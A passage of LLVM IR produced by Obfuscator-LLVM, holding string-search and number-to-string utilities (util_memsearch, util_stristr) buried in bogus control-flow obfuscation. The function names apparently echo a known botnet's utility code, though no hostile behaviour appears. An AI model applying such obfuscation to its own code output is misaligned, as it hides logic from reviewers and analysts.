  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %159

; <label>:154:                                    ; preds = %16
  %155 = load i8*, i8** %7, align 8
  %156 = getelementptr inbounds i8, i8* %155, i64 0
  store i8 48, i8* %156, align 1
  %157 = load i8*, i8** %7, align 8
  %158 = getelementptr inbounds i8, i8* %157, i64 1
  store i8 0, i8* %158, align 1
  br label %159

; <label>:159:                                    ; preds = %154, %originalBBpart254
  %160 = load i8*, i8** %7, align 8
  store i8* %160, i8** %4, align 8
  br label %161

; <label>:161:                                    ; preds = %159, %15
  %162 = load i8*, i8** %4, align 8
  ret i8* %162

originalBBalteredBB:                              ; preds = %originalBB, %26
  store i32 1, i32* %9, align 4
  %163 = load i32, i32* %5, align 4
  %_ = sub i32 0, %163
  %gen = mul i32 %_, %163
  %_1 = sub i32 0, 0
  %gen2 = add i32 %_1, %163
  %_3 = shl i32 0, %163
  %_4 = sub i32 0, %163
  %gen5 = mul i32 %_4, %163
  %_6 = shl i32 0, %163
  %_7 = sub i32 0, %163
  %gen8 = mul i32 %_7, %163
  %_9 = sub i32 0, %163
  %gen10 = mul i32 %_9, %163
  %_11 = sub i32 0, %163
  %gen12 = mul i32 %_11, %163
  %164 = sub nsw i32 0, %163
  store i32 %164, i32* %12, align 4
  br label %originalBB

originalBB13alteredBB:                            ; preds = %originalBB13, %51
  %165 = load i32, i32* %12, align 4
  %166 = load i32, i32* %6, align 4
  %_14 = sub i32 %165, %166
  %gen15 = mul i32 %_14, %166
  %_16 = sub i32 %165, %166
  %gen17 = mul i32 %_16, %166
  %_18 = shl i32 %165, %166
  %_19 = shl i32 %165, %166
  %167 = urem i32 %165, %166
  store i32 %167, i32* %11, align 4
  %168 = load i32, i32* %11, align 4
  %169 = icmp slt i32 %168, 10
  br label %originalBB13

originalBB23alteredBB:                            ; preds = %originalBB23, %79
  %170 = load i32, i32* %11, align 4
  %171 = trunc i32 %170 to i8
  %172 = load i32, i32* %10, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %173
  store i8 %171, i8* %174, align 1
  %175 = load i32, i32* %6, align 4
  %176 = load i32, i32* %12, align 4
  %_24 = sub i32 %176, %175
  %gen25 = mul i32 %_24, %175
  %_26 = sub i32 %176, %175
  %gen27 = mul i32 %_26, %175
  %_28 = sub i32 0, %176
  %gen29 = add i32 %_28, %175
  %_30 = shl i32 %176, %175
  %_31 = sub i32 0, %176
  %gen32 = add i32 %_31, %175
  %_33 = shl i32 %176, %175
  %_34 = shl i32 %176, %175
  %_35 = sub i32 0, %176
  %gen36 = add i32 %_35, %175
  %177 = udiv i32 %176, %175
  store i32 %177, i32* %12, align 4
  %178 = load i32, i32* %10, align 4
  %_37 = sub i32 %178, -1
  %gen38 = mul i32 %_37, -1
  %_39 = sub i32 %178, -1
  %gen40 = mul i32 %_39, -1
  %_41 = sub i32 0, %178
  %gen42 = add i32 %_41, -1
  %_43 = sub i32 0, %178
  %gen44 = add i32 %_43, -1
  %179 = add nsw i32 %178, -1
  store i32 %179, i32* %10, align 4
  br label %originalBB23

originalBB48alteredBB:                            ; preds = %originalBB48, %109
  %180 = load i32, i32* %10, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %181
  store i8 45, i8* %182, align 1
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %132
  %183 = load i8*, i8** %7, align 8
  %184 = load i32, i32* %10, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %185
  %187 = call i32 @util_strcpy(i8* %183, i8* %186)
  br label %originalBB52
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = load i32, i32* @x.79
  %6 = load i32, i32* @y.80
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %14, align 8
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i32 %3, i32* %17, align 4
  store i32 0, i32* %18, align 4
  store i32 0, i32* %19, align 4
  %20 = load i32, i32* %17, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = load i32, i32* @x.79
  %24 = load i32, i32* @y.80
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %32

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 -1, i32* %13, align 4
  br label %82

; <label>:32:                                     ; preds = %originalBBpart2
  store i32 0, i32* %18, align 4
  br label %33

; <label>:33:                                     ; preds = %78, %32
  %34 = load i32, i32* %18, align 4
  %35 = load i32, i32* %15, align 4
  %36 = icmp slt i32 %34, %35
  br i1 %36, label %37, label %81

; <label>:37:                                     ; preds = %33
  %38 = load i8*, i8** %14, align 8
  %39 = load i32, i32* %18, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i8, i8* %41, align 1
  %43 = sext i8 %42 to i32
  %44 = load i8*, i8** %16, align 8
  %45 = load i32, i32* %19, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %43, %49
  br i1 %50, label %51, label %60

; <label>:51:                                     ; preds = %37
  %52 = load i32, i32* %19, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %19, align 4
  %54 = load i32, i32* %17, align 4
  %55 = icmp eq i32 %53, %54
  br i1 %55, label %56, label %59

; <label>:56:                                     ; preds = %51
  %57 = load i32, i32* %18, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %13, align 4
  br label %82

; <label>:59:                                     ; preds = %51
  br label %77

; <label>:60:                                     ; preds = %37
  %61 = load i32, i32* @x.79
  %62 = load i32, i32* @y.80
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  store i32 0, i32* %19, align 4
  %69 = load i32, i32* @x.79
  %70 = load i32, i32* @y.80
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %77

; <label>:77:                                     ; preds = %originalBBpart24, %59
  br label %78

; <label>:78:                                     ; preds = %77
  %79 = load i32, i32* %18, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %18, align 4
  br label %33

; <label>:81:                                     ; preds = %33
  store i32 -1, i32* %13, align 4
  br label %82

; <label>:82:                                     ; preds = %81, %56, %31
  %83 = load i32, i32* %13, align 4
  ret i32 %83

originalBBalteredBB:                              ; preds = %originalBB, %4
  %84 = alloca i32, align 4
  %85 = alloca i8*, align 8
  %86 = alloca i32, align 4
  %87 = alloca i8*, align 8
  %88 = alloca i32, align 4
  %89 = alloca i32, align 4
  %90 = alloca i32, align 4
  store i8* %0, i8** %85, align 8
  store i32 %1, i32* %86, align 4
  store i8* %2, i8** %87, align 8
  store i32 %3, i32* %88, align 4
  store i32 0, i32* %89, align 4
  store i32 0, i32* %90, align 4
  %91 = load i32, i32* %88, align 4
  %92 = load i32, i32* %86, align 4
  %93 = icmp sgt i32 %91, %92
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  store i32 0, i32* %19, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_stristr(i8*, i32, i8*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %5, align 8
  store i8* %13, i8** %8, align 8
  %14 = load i8*, i8** %7, align 8
  %15 = call i32 @util_strlen(i8* %14)
  store i32 %15, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %16

; <label>:16:                                     ; preds = %originalBBpart252, %3
  %17 = load i32, i32* @x.81
  %18 = load i32, i32* @y.82
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* %6, align 4
  %26 = add nsw i32 %25, -1
  store i32 %26, i32* %6, align 4
  %27 = icmp sgt i32 %25, 0
  %28 = load i32, i32* @x.81
  %29 = load i32, i32* @y.82
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %27, label %36, label %195

; <label>:36:                                     ; preds = %originalBBpart2
  %37 = load i8*, i8** %8, align 8
  %38 = getelementptr inbounds i8, i8* %37, i32 1
  store i8* %38, i8** %8, align 8
  %39 = load i8, i8* %37, align 1
  store i8 %39, i8* %11, align 1
  %40 = load i8*, i8** %7, align 8
  %41 = load i32, i32* %10, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %40, i64 %42
  %44 = load i8, i8* %43, align 1
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %11, align 1
  %46 = sext i8 %45 to i32
  %47 = icmp sge i32 %46, 65
  br i1 %47, label %48, label %72

; <label>:48:                                     ; preds = %36
  %49 = load i8, i8* %11, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp sle i32 %50, 90
  br i1 %51, label %52, label %72

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* @x.81
  %54 = load i32, i32* @y.82
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = load i8, i8* %11, align 1
  %62 = sext i8 %61 to i32
  %63 = or i32 %62, 96
  %64 = load i32, i32* @x.81
  %65 = load i32, i32* @y.82
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br label %91

; <label>:72:                                     ; preds = %48, %36
  %73 = load i32, i32* @x.81
  %74 = load i32, i32* @y.82
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %72
  %81 = load i8, i8* %11, align 1
  %82 = sext i8 %81 to i32
  %83 = load i32, i32* @x.81
  %84 = load i32, i32* @y.82
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br label %91

; <label>:91:                                     ; preds = %originalBBpart213, %originalBBpart29
  %92 = phi i32 [ %63, %originalBBpart29 ], [ %82, %originalBBpart213 ]
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %11, align 1
  %94 = load i8, i8* %12, align 1
  %95 = sext i8 %94 to i32
  %96 = icmp sge i32 %95, 65
  br i1 %96, label %97, label %105

; <label>:97:                                     ; preds = %91
  %98 = load i8, i8* %12, align 1
  %99 = sext i8 %98 to i32
  %100 = icmp sle i32 %99, 90
  br i1 %100, label %101, label %105

; <label>:101:                                    ; preds = %97
  %102 = load i8, i8* %12, align 1
  %103 = sext i8 %102 to i32
  %104 = or i32 %103, 96
  br label %108

; <label>:105:                                    ; preds = %97, %91
  %106 = load i8, i8* %12, align 1
  %107 = sext i8 %106 to i32
  br label %108

; <label>:108:                                    ; preds = %105, %101
  %109 = phi i32 [ %104, %101 ], [ %107, %105 ]
  %110 = trunc i32 %109 to i8
  store i8 %110, i8* %12, align 1
  %111 = load i8, i8* %11, align 1
  %112 = sext i8 %111 to i32
  %113 = load i8, i8* %12, align 1
  %114 = sext i8 %113 to i32
  %115 = icmp eq i32 %112, %114
  br i1 %115, label %116, label %161

; <label>:116:                                    ; preds = %108
  %117 = load i32, i32* @x.81
  %118 = load i32, i32* @y.82
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %116
  %125 = load i32, i32* %10, align 4
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %10, align 4
  %127 = load i32, i32* %9, align 4
  %128 = icmp eq i32 %126, %127
  %129 = load i32, i32* @x.81
  %130 = load i32, i32* @y.82
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart232, label %originalBB15alteredBB

originalBBpart232:                                ; preds = %originalBB15
  br i1 %128, label %137, label %160

; <label>:137:                                    ; preds = %originalBBpart232
  %138 = load i32, i32* @x.81
  %139 = load i32, i32* @y.82
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %137
  %146 = load i8*, i8** %8, align 8
  %147 = load i8*, i8** %5, align 8
  %148 = ptrtoint i8* %146 to i64
  %149 = ptrtoint i8* %147 to i64
  %150 = sub i64 %148, %149
  %151 = trunc i64 %150 to i32
  store i32 %151, i32* %4, align 4
  %152 = load i32, i32* @x.81
  %153 = load i32, i32* @y.82
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart244, label %originalBB34alteredBB

originalBBpart244:                                ; preds = %originalBB34
  br label %196

; <label>:160:                                    ; preds = %originalBBpart232
  br label %178

; <label>:161:                                    ; preds = %108
  %162 = load i32, i32* @x.81
  %163 = load i32, i32* @y.82
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %161
  store i32 0, i32* %10, align 4
  %170 = load i32, i32* @x.81
  %171 = load i32, i32* @y.82
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %178

; <label>:178:                                    ; preds = %originalBBpart248, %160
  %179 = load i32, i32* @x.81
  %180 = load i32, i32* @y.82
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %178
  %187 = load i32, i32* @x.81
  %188 = load i32, i32* @y.82
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %16

; <label>:195:                                    ; preds = %originalBBpart2
  store i32 -1, i32* %4, align 4
  br label %196

; <label>:196:                                    ; preds = %195, %originalBBpart244
  %197 = load i32, i32* @x.81
  %198 = load i32, i32* @y.82
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %196
  %205 = load i32, i32* %4, align 4
  %206 = load i32, i32* @x.81
  %207 = load i32, i32* @y.82
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  ret i32 %205

originalBBalteredBB:                              ; preds = %originalBB, %16
  %214 = load i32, i32* %6, align 4
  %215 = add nsw i32 %214, -1
  store i32 %215, i32* %6, align 4
  %216 = icmp sgt i32 %214, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %217 = load i8, i8* %11, align 1
  %218 = sext i8 %217 to i32
  %_ = sub i32 0, %218
  %gen = add i32 %_, 96
  %_2 = sub i32 0, %218
  %gen3 = add i32 %_2, 96
  %_4 = sub i32 0, %218
  %gen5 = add i32 %_4, 96
  %_6 = sub i32 %218, 96
  %gen7 = mul i32 %_6, 96
  %219 = or i32 %218, 96
  br label %originalBB1

originalBB11alteredBB:                            ; preds = %originalBB11, %72
  %220 = load i8, i8* %11, align 1
  %221 = sext i8 %220 to i32
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %116
  %222 = load i32, i32* %10, align 4
  %_16 = sub i32 0, %222
  %gen17 = add i32 %_16, 1
  %_18 = shl i32 %222, 1
  %_19 = sub i32 %222, 1
  %gen20 = mul i32 %_19, 1
  %_21 = shl i32 %222, 1
  %_22 = sub i32 0, %222
  %gen23 = add i32 %_22, 1
  %_24 = sub i32 %222, 1
  %gen25 = mul i32 %_24, 1
  %_26 = shl i32 %222, 1
  %_27 = sub i32 %222, 1
  %gen28 = mul i32 %_27, 1
  %_29 = sub i32 %222, 1
  %gen30 = mul i32 %_29, 1
  %223 = add nsw i32 %222, 1
  store i32 %223, i32* %10, align 4
  %224 = load i32, i32* %9, align 4
  %225 = icmp eq i32 %223, %224
  br label %originalBB15

originalBB34alteredBB:                            ; preds = %originalBB34, %137
  %226 = load i8*, i8** %8, align 8
  %227 = load i8*, i8** %5, align 8
  %228 = ptrtoint i8* %226 to i64
  %229 = ptrtoint i8* %227 to i64
  %_35 = sub i64 %228, %229
  %gen36 = mul i64 %_35, %229
  %_37 = sub i64 0, %228
  %gen38 = add i64 %_37, %229
  %_39 = sub i64 0, %228
  %gen40 = add i64 %_39, %229
  %_41 = sub i64 %228, %229
  %gen42 = mul i64 %_41, %229
  %230 = sub i64 %228, %229
  %231 = trunc i64 %230 to i32
  store i32 %231, i32* %4, align 4
  br label %originalBB34

originalBB46alteredBB:                            ; preds = %originalBB46, %161
  store i32 0, i32* %10, align 4
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %178
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %196
  %232 = load i32, i32* %4, align 4
  br label %originalBB54
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846902}
!2 = !{i32 -2146846493}
